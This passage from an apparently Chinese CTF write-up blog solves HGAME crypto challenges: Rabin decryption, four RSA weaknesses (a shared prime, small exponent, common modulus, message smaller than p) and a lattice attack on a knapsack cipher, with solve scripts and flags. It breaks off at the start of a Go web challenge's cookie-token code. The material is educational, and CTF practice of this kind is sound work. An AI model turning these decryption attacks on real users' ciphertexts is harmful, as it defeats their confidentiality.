class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line"><span class="string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line"><span class="string">   c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$e=2$，Rabin算法解RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">	n = p * q</span><br><span class="line">	mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">	mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">	yp = gmpy2.invert(p, q)</span><br><span class="line">	yq = gmpy2.invert(q, p)</span><br><span class="line">	r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">	rr = n - r</span><br><span class="line">	s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">	ss = n - s</span><br><span class="line">	<span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">p = <span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q = <span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c = <span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="RSA-大冒险1"><a href="#RSA-大冒险1" class="headerlink" title="RSA 大冒险1"></a>RSA 大冒险1</h3><blockquote><p>马上要过年喽，兔兔开心地去超市买年货，但是超市门口却写着”只有完成挑战才能进入超市”，你能帮帮兔兔吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.p = getPrime(<span class="number">128</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.r = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q*self.r)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q*self.r, self.e, self.p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.m = chall2_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.p*self.q)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">3</span></span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge4.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall4_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        self.m = chall4_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure></blockquote><p>求解四层RSA拿flag。</p><p>第一层，$m&lt;p$，无需完全分解 $n$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">304198953434620851532952216290120837853</span></span><br><span class="line">c = <span class="number">0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077d</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c%p,d,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;m&lt;n_But_also_m&lt;p&#x27;</span></span><br></pre></td></tr></table></figure><p>第二层，$\gcd(n1,n2)=p$，交互两次数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317</span></span><br><span class="line">c1 = <span class="number">0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118</span></span><br><span class="line">n2 = <span class="number">59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263</span></span><br><span class="line">c2 = <span class="number">0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6a</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;make_all_modulus_independent&#x27;</span></span><br></pre></td></tr></table></figure><p>第三层，$e=3$，$m^e \lt n$，小 $e$ 攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;encrypt_exponent_should_be_bigger&#x27;</span></span><br></pre></td></tr></table></figure><p>第四层，共模攻击，交互两次数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367</span></span><br><span class="line">e1 = <span class="number">81919</span></span><br><span class="line">c1 = <span class="number">0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169add</span></span><br><span class="line">e2 = <span class="number">108041</span></span><br><span class="line">c2 = <span class="number">0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">	s1 = - s1</span><br><span class="line">	c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">	s2 = - s2</span><br><span class="line">	c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;never_uese_same_modulus&#x27;</span></span><br></pre></td></tr></table></figure><p>四次提交正确得flag：<code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code>。</p><p>​</p><h3 id="包里有什么"><a href="#包里有什么" class="headerlink" title="包里有什么"></a>包里有什么</h3><blockquote><p>兔兔收到了一包年货，但是他忘了里面有什么了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">plain = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + plain + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">v = <span class="built_in">bin</span>(s2n(plain))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(v)</span><br><span class="line">a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">m = randint(<span class="built_in">sum</span>(a), <span class="number">2</span> &lt;&lt; l + <span class="number">1</span>)</span><br><span class="line">w = randint(<span class="number">0</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line">b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    c += b[i] * <span class="built_in">int</span>(v[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b0 = <span class="subst">&#123;b[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line"><span class="comment"># b0 = 69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line"><span class="comment"># c = 93602062133487361151420753057739397161734651609786598765462162</span></span><br></pre></td></tr></table></figure></blockquote><p>先利用 $b_0$ 求 $w$，再解背包密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"></span><br><span class="line">w = b0//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预估长度</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    l = m.nbits() - k</span><br><span class="line">    a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    </span><br><span class="line">    pk =  b</span><br><span class="line">    ct =  c</span><br><span class="line">    n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line">    M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">    M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">    last_col = pk</span><br><span class="line">    last_col.append(ct)</span><br><span class="line">    M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">    M = M.stack(M_last_row)</span><br><span class="line">    M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">    X = M.BKZ()</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">                <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    s = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,sol)),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;:/b2\x83.F\x832z2\x1a\x82v&#123;\x1a\x82Z2G&quot;\x82Z/\x03&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;b\xe8N\xe6\xbeh\xdc\xbef\xc2\xe6\xf2\xbe\xc4\xc2r\xbe\xd2\xe6\xdcn\xbe\xd2\xe8~&#x27;</span></span><br><span class="line"><span class="comment"># b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="零元购年货商店"><a href="#零元购年货商店" class="headerlink" title="零元购年货商店"></a>零元购年货商店</h3><blockquote><p>听说兔兔要买年货，正好提瓦特大陆的璃月海灯节也要到了，tr0uble特地为兔兔准备了一份flag大礼。嗯，你也想要？不可以哦。</p></blockquote><p><code>router/router.go</code> 里主要逻辑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	_, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	userName := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> userName == <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">		c.String(http.StatusForbidden, <span class="string">&quot;兔兔才不可能是你呢！！&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: <span class="string">&quot;230555433&quot;</span>&#125;</span><br><span class="line">	jsonUser, _ := json.Marshal(User)</span><br><span class="line">	token, _ := util.Encrypt(<span class="type">string</span>(jsonUser))</span><br><span class="line">	c.SetCookie(<span class="string">&quot;token&quot;</span>, token, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">	c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 